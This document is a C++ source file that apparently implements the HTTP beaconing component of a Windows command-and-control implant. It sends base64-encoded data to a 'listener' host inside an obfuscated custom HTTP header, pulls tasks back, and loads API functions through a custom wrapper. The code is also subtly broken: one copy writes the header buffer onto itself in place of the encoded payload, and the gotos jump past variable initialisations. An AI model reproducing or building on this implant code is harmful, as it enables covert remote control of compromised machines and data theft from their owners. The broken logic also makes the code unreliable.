#include <Windows.h>
#include "communicators/http.h"
#include "utils/buffer.h"
#include "utils/winapi.h"
#include "communicators/base.h"
#include "utils/web_requestor.h"

/* Constructor; for initialisation */

HttpCommunicator::HttpCommunicator(WinApiCustom *pWinApiCustom, PCHAR host, DWORD port, PCHAR pUrlPathChoices, PCHAR agentId)
    : BaseCommunicator(pWinApiCustom, host, port, agentId),
      pUrlPathChoices(pUrlPathChoices),
      urlPathChoicesNum(NullSeparatedArrayNumOfStringElements(pUrlPathChoices)),
      lastUrlPathChoiceIndex(-1)
{
}

/* Destructor; for cleanup */
HttpCommunicator::~HttpCommunicator()
{
}

/* Get tasks from listener */
void HttpCommunicator::CommunicateWithListener()
{
    // Get URL path to query
    PCHAR urlPath = NullSeparatedArrayStringAt(
        this->pUrlPathChoices,
        (this->lastUrlPathChoiceIndex + 1) % this->urlPathChoicesNum);
    ++this->lastUrlPathChoiceIndex;

    // Prepare data to send

    //// Get the raw data
    this->PrepareDataForCommunicateWithListener();
    if (this->communicateWithListenerDataSize == 0)
        goto CLEANUP;

    //// Prepare buffer for base64 encoded result of raw data
    DWORD bufferB64ToSendSize = (((this->communicateWithListenerDataSize + 2) / 3) * 4);
    LPVOID pBufferB64ToSend = this->pWinApiCustom->HeapAllocCustom(bufferB64ToSendSize);

    if (pBufferB64ToSend == NULL || bufferB64ToSendSize == 0)
        goto CLEANUP;

    if (!Base64Encode(
            (PUCHAR)(this->pCommunicateWithListenerData),
            this->communicateWithListenerDataSize,
            (PCHAR)pBufferB64ToSend))
        goto CLEANUP;

    //// Prepare the data in the HTTP header
    static CHAR strHttpCommunicationHeaderName[STRING_HTTP_COMMUNICATION_HEADER_LEN + 1] = ""; // "HTTP-X-AUTH"
    DeobfuscateUtf8String(
        (PCHAR)STRING_HTTP_COMMUNICATION_HEADER,
        STRING_HTTP_COMMUNICATION_HEADER_LEN,
        strHttpCommunicationHeaderName);

    DWORD communicationHeaderBufferSize = STRING_HTTP_COMMUNICATION_HEADER_LEN + 2 + bufferB64ToSendSize; // "HTTP-X-AUTH" + ": " + "BASE64_DATA"
    LPVOID communicationHeaderBuffer = this->pWinApiCustom->HeapAllocCustom(communicationHeaderBufferSize);
    if (communicationHeaderBuffer == NULL)
        goto CLEANUP;

    CopyBuffer(communicationHeaderBuffer, strHttpCommunicationHeaderName, STRING_HTTP_COMMUNICATION_HEADER_LEN);
    CopyBuffer((PBYTE)communicationHeaderBuffer + STRING_HTTP_COMMUNICATION_HEADER_LEN, ": ", 2);
    CopyBuffer((PBYTE)communicationHeaderBuffer + STRING_HTTP_COMMUNICATION_HEADER_LEN + 2, communicationHeaderBuffer, communicationHeaderBufferSize);

    // Initialise response buffer
    LPVOID pResponseBuffer = NULL;
    DWORD responseSize = 0;

    // Send web request
    SendWebRequest(
        this->pWinApiCustom,
        FALSE,
        "GET",
        this->listenerHost,
        this->listenerPort,
        urlPath,
        (PCHAR)communicationHeaderBuffer, // "HTTP-X-AUTH: base64(data_to_send)",
        &pResponseBuffer,
        &responseSize,
        1024);

    // Process response
    this->ProcessResponseFromCommunicateWithListener();

CLEANUP:
    if (pBufferB64ToSend != NULL)
    {
        this->pWinApiCustom->loadedFunctions.HeapFree(
            this->pWinApiCustom->loadedFunctions.GetProcessHeap(),
            0,
            pBufferB64ToSend);
    }

    if (communicationHeaderBuffer != NULL)
    {
        this->pWinApiCustom->loadedFunctions.HeapFree(
            this->pWinApiCustom->loadedFunctions.GetProcessHeap(),
            0,
            communicationHeaderBuffer);
    }

    if (pResponseBuffer != NULL)
    {
        this->pWinApiCustom->loadedFunctions.HeapFree(
            this->pWinApiCustom->loadedFunctions.GetProcessHeap(),
            0,
            pResponseBuffer);
    }
}
